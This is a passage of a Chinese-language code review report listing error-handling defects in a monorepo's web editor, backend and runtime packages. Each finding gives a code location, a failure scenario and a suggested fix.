**详情**: turbo.json 的 build.env 只声明了 VITEPRESS_BASE,但 web 构建会在编译期把 import.meta.env.VITE_API_BASE(apps/web/src/infra/api/apiConfig.ts:3)与 VITE_PLUGIN_SANDBOX_URL(createWorkspaceWebPluginPlatform.ts:28)内联进产物(docker-images.yml、deploy-smoke.yml 均靠它们注入后端/沙箱地址)。未声明的变量不参与 turbo 哈希,切换这两个值后本地构建会命中旧缓存,产出内联了旧地址的 dist。

**失败场景**: 开发者先 pnpm build:web(默认 VITE_API_BASE)再 VITE_API_BASE=https://api.example.com pnpm build:web,turbo 判定输入未变并还原第一次的缓存产物,dist 仍指向默认 API 地址,部署或本地验证时前端连错后端且无任何告警。

**修复建议**: 在 turbo.json 的 build.env 中补充 VITE_API_BASE 与 VITE_PLUGIN_SANDBOX_URL(以及其它构建期内联变量),使取值变化参与缓存键计算。

#### 3.4.3 error-handling

##### L-EH-01 respondStoreError 把数据库/超时等内部错误统一映射为 422 invalid

- **位置**: [`apps/backend/internal/modules/environment/handler.go:75`](apps/backend/internal/modules/environment/handler.go#L75)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: be-env-auth

**详情**: handler.go:74-76 的 default 分支将所有非 ErrUnavailable/ErrNotFound/ErrPermissionDenied/ErrRevisionConflict 的 store 错误映射为 422 ENV-4001 Execution environment is invalid,包括 pgx 连接失败、context deadline exceeded(恰是密钥相关发现 2/3 的超时产物)、唯一约束冲突等。ErrUnavailable 有 503 加 WithRetryable(true),而这些同属瞬时内部故障却被报成客户端校验错误,与模块自身的可重试语义不一致。

**失败场景**: PostgreSQL 主备切换期间 PutSnapshot 的 BeginTx 返回连接错误,客户端收到 422 Execution environment is invalid 而非 503 加 retryable,具备重试能力的客户端停止重试或向用户提示参数无效,本次快照写入被静默放弃。

**修复建议**: 区分内部错误:对 context.DeadlineExceeded、pgx 连接类错误返回 503 加 WithRetryable 或 500;422 仅保留给真实校验失败(normalize 阶段的 errors)。

##### L-EH-02 decodeURIComponent 抛出的 URIError 被映射为 500 而非 400

- **位置**: [`apps/remote-runner-control-plane/src/httpHandler.ts:908`](apps/remote-runner-control-plane/src/httpHandler.ts#L908)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: app-runner-cp

**详情**: 所有路径参数解析点(如 317、367、400-403、509、516 行)直接调用 decodeURIComponent,非法百分号序列(如 %ff)会抛 URIError;catch 分支(905-910 行)只对带 status 的错误与 TypeError 做映射,URIError 既无 status 也不是 TypeError,落入 500 internal。

**失败场景**: 已认证客户端请求 GET /v1/executions/%ff/artifacts/a/content,或 worker 请求 /internal/v1/executions/%ff/transition,均得到 500 而非 400;批量此类请求会把客户端错误伪装成服务端故障,触发可用性告警误报。

**修复建议**: 封装 safeDecodeURIComponent,捕获 URIError 后抛出带 status 400 的错误(或 TypeError),在所有路径参数解码点统一使用。

##### L-EH-03 无效/空的 data mutation 绑定被显示为首个可选项,掩盖未设置状态

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/fields/triggers/InspectorTriggerItem.tsx:115`](apps/web/src/editor/features/blueprint/editor/inspector/fields/triggers/InspectorTriggerItem.tsx#L115)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-bp-insp-a

**详情**: selectedDataOperation(第108-115行)在 params.operation 缺少 documentId/operationId 时回退到 dataMutationOptions[0]?.reference,并作为 operation 传给 TriggerDataMutationFields 用作 select 的选中值;但没有任何 effect 把该回退写回 params.operation,导致界面显示与实际绑定不一致。

**失败场景**: 在 dataMutationOptions 尚为空时创建 executeDataMutation trigger,createDefaultActionParams(第51行)写入 operation 空对象;随后 options 加载,select 显示首个 mutation 为已选中,但 params.operation 仍是空对象。用户以为已绑定,运行时执行空 operation 失败/无操作,而界面显示为有效选择。

**修复建议**: 区分已选与回退占位:无有效 operation 时 select 应显示占位项(value 空)并提示未绑定,或在 options 可用时显式写入默认 operation,避免显示值与实际 params.operation 不一致。

##### L-EH-04 语义导航目标节点不存在时静默返回,请求永不消费且无提示

- **位置**: [`apps/web/src/editor/features/development/reactflow/NodeGraphEditorContent.tsx:386`](apps/web/src/editor/features/development/reactflow/NodeGraphEditorContent.tsx#L386)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-dev-a

**详情**: 语义导航 effect(第367-400行)在 非 nodes.some(node.id === nodeId) 时直接 return(第386行),既不调用 consumeSemanticNavigation,也不 setHint。若诊断引用的节点已被删除,或目标图文档 invalid(activeContent 回退为 EMPTY_NODEGRAPH_DOCUMENT、nodes 恒为空,第116-119行),导航请求将永久滞留 store,用户被切到目标图却看不到任何选中或失败反馈。

**失败场景**: 在 Issues 面板点击一条过期诊断(引用的 nodegraph-node 已被删除),编辑器切到对应图,但无节点选中、无 hint;navigationRequest 不被消费,之后针对同一请求 id 的消费/去重逻辑行为异常,用户对为何什么都没发生毫无线索。

**修复建议**: 目标图已激活但节点不存在(或文档 invalid)时,给出目标节点不存在/文档无效类 hint 并调用 consumeSemanticNavigation,使失败路径也有明确反馈,避免请求滞留。

##### L-EH-05 downloadProjectZip 无 catch,jszip 动态加载/打包失败产生未处理拒绝且无用户反馈

- **位置**: [`apps/web/src/editor/features/export/ExportCode.tsx:420`](apps/web/src/editor/features/export/ExportCode.tsx#L420)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: web-settings-misc

**详情**: downloadProjectZip(414-443 行)使用 try 加 finally setDownloadingZip(false) 但没有 catch。await import(jszip)(420 行)或 zip.generateAsync(type blob)(431 行)抛错时,Promise 拒绝会传播到 onClick={onDownloadZip}(无包装)成为 unhandled rejection,UI 上仅表现为按钮结束 downloading 状态,没有任何错误提示。

**失败场景**: 部署后旧页面持有失效的 chunk hash(或离线环境)时点击 Download ZIP:import(jszip) chunk 加载失败,控制台 unhandled promise rejection,下载没有任何反应也没有 toast/错误信息,用户反复点击无果且无法区分无文件可导出与加载失败。

**修复建议**: 为 try 块增加 catch:捕获后通过 diagnostics/toast 或局部错误状态提示导出打包失败,请重试,必要时重新加载页面;保持 finally 复位 downloadingZip。

##### L-EH-06 Quick Fix 派发未捕获异常,IndexedDB 失败时静默无反馈

- **位置**: [`apps/web/src/editor/features/issues/workspaceIssueQuickFixRegistry.ts:72`](apps/web/src/editor/features/issues/workspaceIssueQuickFixRegistry.ts#L72)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-code-issues

**详情**: executeWorkspaceIssueQuickFix 直接 await dispatchWorkspaceAuthoringOperation(第 72、83 行),其内部 enqueueWorkspaceOperationOutboxAndDispatch 的 await store.enqueue(created.entry)(IndexedDB 写入)没有 try/catch,可能抛错(配额超限、存储不可用、workspace 切换期间 DB 关闭)。异常会一路传到 WorkspaceIssuesPage.tsx 第 429-435 行 onClick 的 async 回调(同样无 catch),成为 unhandled promise rejection,且 setActionMessage 永不执行,用户点击 Quick Fix 后毫无反馈。同仓其他派发点(useCodeAuthoringSession.save 的 catch、CodeAuthoringWorkspace.executeVfsIntent 的 catch)都显式处理了此类抛错。

**失败场景**: 浏览器 IndexedDB 写入失败(隐私模式/配额满/DB 被关闭)时,用户在 Issues 页点击 Quick Fix 按钮,enqueue 抛错,Promise rejection 无人处理,按钮像没反应一样,既无 applied/rejected 提示也无错误消息。

**修复建议**: 在 executeWorkspaceIssueQuickFix 中用 try/catch 包裹 dispatch,将异常映射为 status rejected(可携带错误消息),或在 WorkspaceIssuesPage 的 onClick 中 catch 并 setActionMessage。

##### L-EH-07 同名资产导入/新建被静默跳过,用户得不到任何失败或跳过反馈

- **位置**: [`apps/web/src/editor/features/resources/PublicResourcePage.tsx:428`](apps/web/src/editor/features/resources/PublicResourcePage.tsx#L428)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: web-resources

**详情**: createAssetDocument 在目标路径已存在 asset 文档时 if (existing) return false(423-428 行),而 handleImportFiles/handleImportFilesByCategory/handleCreateFile/handleCreateFileByKind 均不检查返回值,也不设置 assetOperationError:import 循环继续并最终表现为成功,新建文件则点了毫无反应。只有抛异常才会进入错误提示分支,这种预期内的冲突被完全吞掉。

**失败场景**: 用户更新本地 logo.png 后重新拖入 /public/images 覆盖:上传被静默跳过,无错误横幅、无提示,workspace 中仍是旧文件,用户误以为已更新并继续后续工作。

**修复建议**: 返回 false 的冲突路径设置 assetOperationError(如文件已存在,跳过 N 个)或提供覆盖确认,让调用方对跳过的文件给出可见反馈。

##### L-EH-08 角色授予/撤销成功后刷新列表失败会显示误导性权限错误并清空列表

- **位置**: [`apps/web/src/editor/features/settings/WorkspaceCollaborationSettings.tsx:81`](apps/web/src/editor/features/settings/WorkspaceCollaborationSettings.tsx#L81)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-settings-misc

**详情**: saveRole(74-81 行)在 putWorkspaceExecutionRole 成功后 await loadRoles();revokeRole(98-103 行)同理。loadRoles 的 catch(53-58 行)会把错误吞掉并执行 setRoles([]) 加 setError(loadError),loadError 文案是 Only the Workspace owner can manage collaborators。由于 loadRoles 内部吞错,saveRole/revokeRole 的 catch 永远不会对刷新失败作出区分。

**失败场景**: Owner 成功给协作者授予 editor 角色(PUT 200),紧接着 GET 列表请求因瞬时网络抖动/500 失败,UI 清空已有协作者列表并提示只有 Owner 才能管理协作者,把一次成功的写操作呈现为权限失败;用户误以为授予失败或列表丢失,可能重复操作或对系统状态产生误判(服务端实际已存在该角色)。

**修复建议**: 在 saveRole/revokeRole 内用 try/catch 单独包裹刷新:刷新失败时保留现有 roles(或按本次变更乐观更新),并展示保存成功但刷新失败类错误,而不是复用 load 的权限错误文案。

**验证备注**: 已读代码核实:apiClient.ts:118-120 对非 ok 抛错,GET 500/抖动必抛;loadRoles(53-58)catch 无 rethrow,执行 setRoles([]) 加 setError(loadError)(30-33 行权限文案);saveRole 70 行保证 token/workspaceId,81 行无 signal 调用 loadRoles,saveRole catch(82-90)永不触发。测试仅快乐路径,无兜底。

##### L-EH-09 openLocalProjectDatabase 缺少 onblocked,DB 版本升级被旧标签页阻塞时 Promise 永久挂起

- **位置**: [`apps/web/src/editor/localProjectStore.ts:135`](apps/web/src/editor/localProjectStore.ts#L135)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-editor-core

**详情**: openLocalProjectDatabase(129-190 行)对 indexedDB.open(LOCAL_PROJECT_DB_NAME, 3) 只设置了 onupgradeneeded/onerror/onsuccess,没有 onblocked。当另一个标签页仍持有旧版本(小于3)连接时,本次带版本号的 open 会触发 blocked 事件,由于无人处理,Promise 既不 resolve 也不 reject,所有依赖它的读写(listLocalProjectCatalog、getLocalProject、mutateLocalProject)全部无限挂起。同模块组的 localWorkspaceAssetBlobStore.openLocalAssetDatabase 显式写了 request.onblocked reject(67-68 行),此处遗漏。

**失败场景**: 发布带 DB 版本升级的新版本后,用户一个旧标签页仍开着 v2 连接,新标签页以 v3 打开 prodivix-local-projects,blocked 挂起,EditorHome 的本地项目列表或 Editor 打开本地项目时永远停在加载态,直到关闭旧标签页。

**修复建议**: 添加 request.onblocked reject(new Error(Local project database upgrade is blocked.)),与 asset store 保持一致。

##### L-EH-10 语义导航写 localStorage 未包 try/catch,存储受限环境下抛错中断导航

- **位置**: [`apps/web/src/editor/navigation/workspaceSemanticNavigation.ts:135`](apps/web/src/editor/navigation/workspaceSemanticNavigation.ts#L135)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-editor-core

**详情**: navigateToWorkspaceSemanticTarget 的 openCodeArtifact(135-138 行)与 source-span 分支(159-163 行)在 typeof window !== undefined 后直接 window.localStorage.setItem(getCodeAuthoringSelectionStorageKey(input.projectId), artifactId)。Safari 隐私模式、存储配额耗尽或 cookie 禁用时 setItem 会抛 QuotaExceededError/SecurityError,异常直接从导航函数向上抛出,导致 setActiveDocumentId 之后的路由跳转被中断。同仓库 EditorDebugFloatingBall.tsx 对所有 localStorage 读写都做了 try/catch,此处缺失。选中态存储只是辅助状态,不应阻断主导航。

**失败场景**: Safari 隐私浏览模式下,用户在 Issues/诊断面板点击跳转到某个代码符号定义:setActiveDocumentId 已执行,随后 localStorage.setItem 抛错,navigate(basePath/code) 未执行,页面停留在原处且错误冒泡给调用方。

**修复建议**: 将两处 setItem 包进 try/catch 忽略失败(选中恢复属于尽力而为的辅助状态)。

##### L-EH-11 JSON content-type 但 body 为空/非法时抛裸 SyntaxError,绕过 ApiError 契约

- **位置**: [`apps/web/src/infra/api/apiClient.ts:117`](apps/web/src/infra/api/apiClient.ts#L117)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-app-infra

**详情**: 原文引用的 handler.go:604 并不直达 apiClient:/remote-executions 的 web 消费方是 remoteExecutionHttpPort.ts 的裸 fetch 字节流,不经 apiRequest;且一方后端的 auth/workspace 错误均经 backendresponse.Error 到 c.JSON 带合法 JSON body,触发实际依赖外部网关/代理返回 JSON 类型加空/非法 body。缺陷机制本身准确:parseResponsePayload(35-41)无 try/catch,117 行先于 ok 判定解析,裸 SyntaxError 绕过 ApiError,所有 instanceof 恢复分支失效;apiBinaryRequest:135 同样存在此问题。

**失败场景**: 网关/代理对 /auth/me 返回 401 且 body 为空、content-type 为 application/json,response.json() 抛 SyntaxError,AuthSessionSync.tsx:34 的 error instanceof ApiError 且 error.status === 401 判定不成立,失效会话永不清除;所有调用方依赖 instanceof ApiError 的状态码、retryable、diagnostics 恢复分支全部失效,错误退化为通用 Something went wrong。

**修复建议**: 在 apiRequest 中对响应体解析包 try/catch:解析失败时回退为 text 或 undefined,确保非 2xx 响应一律抛带 status 的 ApiError(toApiError 支持 payload 为 undefined),成功路径对空 body 返回 undefined 而非崩溃。

**验证备注**: 机制属实:apiClient.ts:35-41 对 JSON content-type 直接 response.json() 且无兜底;117 行在 118 行非 response.ok 之前 await 解析且无 try/catch;仅 204(113 行)提前返回。空/非法 JSON body 抛裸 SyntaxError,永远到不了支持 undefined payload 的 toApiError(63-77 行)。

##### L-EH-12 write_env_file 以未加引号方式写入用户输入的密码,含 # 或空格时静默截断/解析失败

- **位置**: [`deploy/start-app.sh:153`](deploy/start-app.sh#L153)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: infra-scripts

**详情**: write_env_file 的 heredoc 直接写出 POSTGRES_PASSWORD=$postgres_password、BACKEND_ALLOWED_ORIGINS=$allowed_origins 等未加引号的行,而 docker compose 的 .env 解析器把未引用的 # 之后内容当注释丢弃、对含空格的值报 unexpected character。prompt_secret(第 240 行)允许用户键入任意字符且无字符集约束。

**失败场景**: 交互部署时用户在隐藏的 Postgres password 提示输入 p#secret,.env 写入 POSTGRES_PASSWORD=p#secret,postgres 容器与 backend 实际拿到的密码是 p(与用户预期不符但服务正常,弱口令上线);若输入 my pass 则 compose up 直接以解析错误失败,报错信息不指向真正原因。

**修复建议**: 对写入 .env 的值做单/双引号包裹并转义内部引号,或在 prompt 后校验密码只含 .env 安全字符,含非法字符时拒绝并要求重输。

##### L-EH-13 generate() 中 response.json() 未包进 LlmProviderError,非 JSON 响应丢失错误码与 rawResponse

- **位置**: [`packages/ai/src/providers/openAICompatibleProvider.ts:208`](packages/ai/src/providers/openAICompatibleProvider.ts#L208)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ai-diag

**详情**: generate() 对 const body = await response.json()(208 行)没有 try/catch,而紧随其后的 extractStructuredOutput 解析失败会被包成带 code AI-4002 的 LlmProviderError(212-221 行)。当 2xx 响应体不是 JSON 时,裸 SyntaxError 直接外抛。下游 gateway(packages/shared/src/llm/gateway.ts:259-269)仅当 error instanceof LlmProviderError 才提取 code/rawResponse/severity,裸错误只会得到 Unexpected token 文案。discoverOpenAICompatibleModels.ts:57 存在同样缺口。

**失败场景**: 用户把 baseURL 配错或企业代理对 /chat/completions 返回 HTTP 200 的 HTML 拦截页,response.json() 抛 SyntaxError,失败诊断没有 AI-* 码、没有 rawResponse,错误归类与修复提示链路失效,用户只看到 Unexpected token 小于。

**修复建议**: 用 try/catch 包住 response.json(),失败时抛 LlmProviderError(如 code AI-1002,message 说明响应体非合法 JSON),保持与 extractStructuredOutput 分支一致的错误形状。

##### L-EH-14 decodeControlledSourceManifest 重复 region 诊断路径使用解码后数组下标,指向错误 region

- **位置**: [`packages/authoring/src/controlledSource.ts:296`](packages/authoring/src/controlledSource.ts#L296)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-authoring

**详情**: decodeControlledSourceManifest 先用 decodeRegionBinding 收集成功解码的 bindings,再用 bindings.forEach((binding, index)) 检测重复 id,并把问题路径写成 /regions/index/id(第296行)。这里的 index 是成功解码的 bindings 数组下标,而非原始 value.regions 数组下标;若前面有 region 解码失败,后续重复项报告的 path 会整体偏移,指向另一个 region。最终结果仍是 invalid(fail-closed,功能正确),但 Issues 面板据 path 定位时会误导用户。

**失败场景**: metadata.regions 含 非法 region(adapterId 无效)再加两个 id a 的 region:前两个解码失败/首个成功后,重复告警上报 path=/regions/1/id 而非真实的 /regions/2/id,用户按诊断跳转到的是第一个合法 region,无法直接定位真正重复声明者。

**修复建议**: 在 decodeRegionBinding 阶段同时返回原始 regions 下标,或在检测到重复时通过 binding 反查其在 value.regions 中的原始 index 来生成 path。

##### L-EH-15 重试等待以可能为 undefined 的 signal.reason 拒绝,导致 executeDataOperation 抛出 undefined

- **位置**: [`packages/data/src/dataPolicyRuntime.ts:62`](packages/data/src/dataPolicyRuntime.ts#L62)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-data

**详情**: defaultDataOperationScheduler.wait 在第 62 行与第 71 行以 signal.reason 作为拒绝值;而 DataOperationAbortSignal 契约声明 reason?: unknown,允许 undefined。dataRuntime.ts:798-799 在退避等待被中止时执行 if (input.signal.aborted) throw schedulerError,将 undefined 原样重抛;外层 catch(dataRuntime.ts:910)在 aborted 时直接 throw error,rejection 值即为 undefined。

**失败场景**: 宿主使用自定义 signal 实现(契约允许缺省 reason),在 mutation 重试退避期间 abort,executeDataOperation 的 Promise 以 undefined 拒绝,调用方 catch 中访问 error.code / error.message 触发 TypeError,真实中止原因丢失,且 error 分支的遥测/上报拿到 undefined。

**修复建议**: wait 拒绝前将 reason 规范化为真实错误(缺省时回退为携带 aborted 语义的 DataInvocationError 或 DOMException);dataRuntime.ts:799 的重抛路径同样保证抛出 Error 对象。

##### L-EH-16 解码/校验对深层嵌套无深度护栏,RangeError 穿透 fail-closed 边界

- **位置**: [`packages/pir/src/codec/pirCodec.ts:124`](packages/pir/src/codec/pirCodec.ts#L124)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-pir

**详情**: checkJsonValue(124-149 行)与 canonicalize(1212-1221 行)对 JSON 值无界递归;pirValidator.ts 的 visitForCycles(483-499 行)、visitReachable(507-513 行)对父子链无界递归。decodePirDocument/validatePirDocument 的设计契约是返回 ok false/issues 的 fail-closed 结果,但数千层嵌套会抛 RangeError 直接穿透。同包 pirDataOperationInput.ts 已有 depth 大于 32、nodes 大于 10000 护栏,说明项目认可此类边界,此处缺失。

**失败场景**: wire 文档 nodesById.r.props.p 为 kind literal value 嵌套约 5k 层(约 10KB 载荷),checkJsonValue 在 V8 默认栈深抛 RangeError: Maximum call stack size exceeded,decodePirDocument 不返回 ok false 而直接抛出;只处理结果对象的调用方(导入、IndexedDB 副本恢复、Atomic Commit 解码)随之崩溃。1 万+层级的深父子链文档同样会崩 validatePirDocument。

**修复建议**: 为 checkJsonValue/canonicalize 增加深度或节点数上限并转成 PIR_WIRE_INVALID issue;图遍历改迭代(如 collectPirSubtreeNodeIds 已是迭代写法),将越界输入纳入 fail-closed 结果。

##### L-EH-17 discover 提交失败后的 activation-rollback 清理诊断被整体丢弃

- **位置**: [`packages/plugin-host/src/lifecycle/availabilityLifecycle.ts:307`](packages/plugin-host/src/lifecycle/availabilityLifecycle.ts#L307)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-plugin-host

**详情**: discover 的 非 committed.ok 分支(第 302-313 行)在 else 路径执行 context.records.set(manifest.id, candidate); await context.cleanupRecord(candidate, operation.operationId, activation-rollback, true),但 cleanupRecord 的返回值被直接丢弃:既不 push 进 diagnostics(随后传给 publishFailedCandidate 发布到 snapshot 并写入 audit),也不返回给调用方。cleanupRecord 内部会 deactivate runtime、dispose pendingActivation 与 installation contributions,任何 disposer 抛错都会产生 OWNER_CLEANUP_FAILED(错误级)诊断——这些诊断在此路径上全部蒸发,泄漏的 contribution 资源/会话句柄对调用方、订阅者与审计系统均不可见。

**失败场景**: 插件升级发现(discover 带 previous)时,transaction.commit() 因替换旧条目 dispose 失败而返回 ok:false(state===committed);随后对 candidate 的 cleanupRecord 中某个 contribution 的 dispose 也抛错。最终 snapshot 与返回结果只包含最初的 commit 诊断,candidate 的清理失败诊断丢失,被泄漏的 Worker/dispose 句柄没有任何审计记录可供排查。

**修复建议**: 将 cleanupRecord 的返回值并入 diagnostics:diagnostics.push(...await context.cleanupRecord(...)),使清理失败随 publishFailedCandidate 的 snapshot 与 appendAudit 一并上报。

##### L-EH-18 entryModuleId 未匹配任何模块时静默回退到第一个模块作为入口,不产生诊断

- **位置**: [`packages/prodivix-compiler/src/export/planner.ts:722`](packages/prodivix-compiler/src/export/planner.ts#L722)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-compiler-export

**详情**: plan() 中 entryFilePath = program.entryFilePath 或 entryModuleFilePath 或 modulesWithStyleImports[0]?.filePath(第 719-725 行)。当 program.entryModuleId 有值但没有模块与之匹配时 entryModuleFilePath 为 undefined,随即静默取模块数组首项作为入口。ProductionExportPlanner 与 ExportProgramBuilder 是包的公开 API(index.ts 导出),且 builder 对 entryModuleId 采用后来者覆盖合并(programBuilder.ts 第 72 行),过期 id 不会被发现。

**失败场景**: 调用方(或合并多个 contribution 后)提供 entryModuleId app-entry,但该模块因上游改动未再被加入 program.modules:导出 bundle 不报任何诊断,entryFilePath 指向数组中第一个不相关模块(如某组件文件),生成的工程构建后挂载错误的根组件,问题被完全掩盖。

**修复建议**: 当 program.entryModuleId 有值却找不到对应模块时,产生 error 级 CompileDiagnostic(或将 exportBlocked 置真),而不是静默回退到 modulesWithStyleImports[0]。

##### L-EH-19 生成的 Vue 运行时 call-code 触发器未捕获 Promise 拒绝,产生 unhandled rejection

- **位置**: [`packages/prodivix-compiler/src/vue/workspaceApp.ts:563`](packages/prodivix-compiler/src/vue/workspaceApp.ts#L563)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-pir-renderer

**详情**: 生成的 dispatchTrigger 中 dispatch-data-operation 分支带 .catch(error 到 console.error)(第553行),而 call-code 分支为 void Promise.resolve(callback(input.payload, 冻结的 source/scope))(第563行),没有 .catch。用户 CodeArtifact 导出函数若返回 rejected Promise(或 async 抛错),将成为未处理的 Promise 拒绝;同步 throw 则直接从 PIR 事件处理器向上抛出。

**失败场景**: 导出的 Vue 应用中,按钮绑定 call-code 触发的代码函数执行 throw new Error(x)(async),每次点击都触发 window unhandledrejection;在 vitest/Node strict 未处理拒绝策略下直接导致测试进程失败,而同类的 data mutation 错误有统一的 console.error 降级,行为不一致。

**修复建议**: 与 dispatch-data-operation 保持一致:void Promise.resolve(callback(...)).catch(error 到 console.error(error instanceof Error 时 error.message 否则 CODE_CALLBACK_FAILED))。

##### L-EH-20 publishTrace 抛错会把成功响应转为失败并重复发布 trace

- **位置**: [`packages/runtime-browser/src/browserNetworkAdapter.ts:203`](packages/runtime-browser/src/browserNetworkAdapter.ts#L203)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-browser

**详情**: 成功路径第 203 行 options.publishTrace?.(completedTrace) 位于 try 内;若该回调抛错,catch 会再发布一条 outcome failed 的 trace,并把本已成功的响应包装成 BrowserNetworkRequestError 抛出。若 publishTrace 第二次仍抛,该异常原样逃逸(不再是 BrowserNetworkRequestError)。

**失败场景**: publishTrace 实现对超量 trace 抛错,一次 200 的成功请求被上报为网络失败,调用方按失败重试;同一请求留下一条 allowed 加一条 failed 的矛盾 trace,且统计口径错误。

**修复建议**: 把 publishTrace 调用移出请求 try 块,或单独 try/catch 静默降级(观察者不应改变请求结果);catch 内避免再次无保护调用外部回调。

##### L-EH-21 publishServerFunctionTraces 吞掉全部 readFile 错误,静默丢弃追踪

- **位置**: [`packages/runtime-browser/src/browserProjectTestRunner.ts:323`](packages/runtime-browser/src/browserProjectTestRunner.ts#L323)
- **类别**: error-handling ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-browser

**详情**: 对 runtimeHost.readFile(SERVER_RUNTIME_TEST_INVOCATION_TRACE_FILE_PATH, lease) 的 catch return 无任何区分与注释。文件缺失属预期,但 BrowserProjectRuntimeHostLeaseError(共享 host 被他者 prepare 顶替)等真实错误同样被吞:server-function 调用追踪被静默丢弃,任务仍按成功上报。

**失败场景**: preview 与 test runner 共享同一 runtimeHost:test 任务 A 读完报告、发布 trace 前,preview 任务 B 调 prepare,activeLease 失效,A 的 readFile 抛 LeaseError 被吞,成功报告中 server-function 追踪全部缺失,排障时看不到任何调用记录且无日志线索。

**修复建议**: 区分文件不存在(静默 return)与其他错误:对 LeaseError/runtime 错误至少 emitLog 或 emitDiagnostic 说明追踪不可用,避免无声丢弃。

##### L-EH-22 job.completion 的 then 无拒绝处理,provider 拒绝会导致未处理拒绝

- **位置**: [`packages/runtime-core/src/executionSession.ts:473`](packages/runtime-core/src/executionSession.ts#L473)
- **类别**: error-handling ｜ **置信度**: low ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-core

**详情**: activate 中 void activation.job.completion.then(result 到 ...) 只挂 fulfillment 回调,没有 .catch。ExecutionJob 是公开端口类型,由其他包的 provider 实现;类型未约束 completion 永不 reject。一旦某个 adapter 在传输失败时 reject completion,该 promise 链产生 unhandled rejection,且该 session 的 terminal 状态永远不会被最终化(snapshot.status 停留在 running)。

**失败场景**: 远端 provider adapter 在 WebSocket 断开时以 reject 结算 completion(而非 resolve 为 failed 结果):Node 宿主(默认 --unhandled-rejections=throw)进程崩溃;浏览器宿主报错且该 session 快照永远显示 running,恢复计划(createExecutionSessionRecoveryPlan)一直返回 active 不可恢复。

**修复建议**: 为该 then 增加拒绝处理:.then(onSettled, error 到 reportSubscriberError(error)),或在文档/类型契约中明确 completion 必须永远 resolve 并在适配器层兜底。

##### L-EH-23 requestClose 回调在命令队列满时会同步抛 quota-exceeded,租约过期路径会使 getSnapshot/sweepExpired 抛出异常

- **位置**: [`packages/runtime-remote/src/remoteExecutionTerminalBroker.ts:337`](packages/runtime-remote/src/remoteExecutionTerminalBroker.ts#L337)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-runtime-remote

**详情**: open() 将 requestClose 接线为 reason 到 enqueueCommand(stored, kind close),而 enqueueCommand 在 commands.length 大于等于 maximumCommands(256)或超字节预算时同步抛 RemoteExecutionTerminalBrokerError(quota-exceeded)。runtime-core 的 session.write/resize/signal/close 都会捕获 request* 回调错误(返回 rejected),唯独租约过期路径 requestForcedClose 以 void Promise.resolve(input.requestClose(reason)) 调用——同步抛发生在 Promise.resolve 求值之前,无守卫,异常会穿透 expireLease 并从 getSnapshot() 同步抛出。本 broker 的 sweepExpired(第 430 行)与 open() 的既有会话检查(第 283 行)都直接调用 getSnapshot。

**失败场景**: worker 停止轮询但租约仍有效,客户端持续 write 输入直到 256 条未确认命令入队(此后 write 返回 rejected,队列保持满);租约到期后第一次 sweepExpired 调用 getSnapshot,expireLease,closeFromProvider(lease-expired) 加 requestForcedClose,enqueueCommand 抛 quota-exceeded,sweepExpired 以误导性错误 reject,本轮 GC 中断(插入序在其后的会话全部被跳过),同一 execution 的下一次 open() 也会以 quota-exceeded 失败;需第二次 sweep 才自愈。

**修复建议**: 让 requestClose 回调不抛异常(队列满时静默丢弃或返回结果),或在 sweepExpired/open 的 getSnapshot 调用外包 try/catch 并对异常会话执行 closeStored 兜底。

##### L-EH-24 LlmGateway 在 try 外调用 tools.pick,未知工具名绕过失败结果与 trace 记录

- **位置**: [`packages/shared/src/llm/gateway.ts:110`](packages/shared/src/llm/gateway.ts#L110)
- **类别**: error-handling ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-shared-assets

**详情**: run() 中 110 行 const allowedTools = this.tools.pick(task.allowedTools) 位于 try(113 行)之前;LlmToolRegistry.pick 对未注册工具抛 Unknown LLM tool: name。stream() 同样在首个 yield 前(130 行)调用 pick。该异常绕过 createFailureResult:不产出 status failed 加 AI-9001 诊断结果,也不写 traceStore,与类注释 records trace data, and returns a result ready for planning 不符。

**失败场景**: 任务 allowedTools 引用了已卸载插件的工具名或拼写错误,run() 直接 reject(stream() 在首次 next() 时 reject),调用方(如 BlueprintAssistantPanel)得到未处理异常而非失败结果,traceStore 中无任何 trace 可供排障。

**修复建议**: 把两处 pick 移入 try 块(stream() 中置于首个 yield 之后的 try 内),使未知工具经 createFailureResult 统一返回带诊断的失败结果并记录 trace。

